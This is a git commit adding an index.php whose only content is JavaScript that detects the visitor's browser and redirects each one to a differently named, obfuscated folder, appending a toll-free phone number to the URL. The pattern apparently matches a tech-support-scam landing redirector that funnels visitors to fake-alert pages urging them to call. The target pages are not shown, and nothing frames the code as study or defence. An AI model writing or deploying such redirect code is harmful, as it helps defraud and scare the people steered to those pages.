de9f5a06fb2161550e123000f0b73abfda1d4d5e
tanujattri <88634099+tanujattri@users.noreply.github.com>
2021-08-09 03:13:09 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,35 @@
+<script type="text/javascript">
+var isChromium = window.chrome,
+	vendorName = window.navigator.vendor,
+	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
+
+if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+	// is Google chrome
+window.location.href = "./ENJdfdfdDEfMnifd0CH101077Ta8/index.html?phone=+1-844-322-2922";
+}
+if(navigator.userAgent.indexOf("Firefox") != -1 )
+	{
+			 window.location.href = "./ENJdfdfdDEfMnifd00FF101077Ta8/index.html?phone=+1-844-322-2922";
+	}
+
+	if(window.navigator.userAgent.indexOf("dg") != -1 )
+		{
+				 window.location.href = "./ENJdfdfdDEfMnifd0ECH101077Ta8/index.html?phone=+1-844-322-2922";
+		}
+
+if(window.navigator.userAgent.indexOf("Edge") != -1 )
+	{
+			 window.location.href = "./ENJdfdfdDEfMnifd0ED101077Ta8/index.html?phone=+1-844-322-2922";
+	}
+if(window.navigator.userAgent.indexOf("Mac") != -1 )
+	{
+			 window.location.href = "./ENJdfdfdDEfMnifd00MA101077Ta8/index.html";
+	}
+if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+	{
+		window.location.href = "./ENJdfdfdDEfMnifd00iE101077Ta8/index.html?phone=+1-844-322-2922";
+	}
+$SAFARI_URL = "apple";
+</script>
